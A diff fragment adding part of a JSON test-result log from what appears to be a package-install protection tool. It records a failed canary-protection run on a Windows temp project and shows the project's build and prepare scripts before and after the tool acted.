+      "stderr": "✖ Canary protection failed; command was not started\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-6\",\"error\":\".gitignore is not a regular file\"}\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-6\\\\canary.js\",\"status\":\"failed\",\"error\":\".gitignore is not a regular file\"}\n✖ {\"path\":\"C:\\\\Users\\\\tionn\\\\AppData\\\\Local\\\\Temp\\\\npa-live-protection-tjPext\\\\project-6\\\\canary.js\"}\n",
+      "before": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "node canary.js && tsc",
+          "prepare": "node canary.js"
+        },
+        "staleMarkerPresent": false,
+        "lockfilePresent": false
+      },
+      "after": {
+        "canaryPresent": true,
+        "scripts": {
+          "build": "tsc"
+        },
+        "hook": "#!/bin/sh\necho preserved\n",
+        "ignore": null,
+        "staleMarkerPresent": false,
+        "lockfilePresent": false,
+        "quarantine": []
+      }
+    }
+  ]
+}
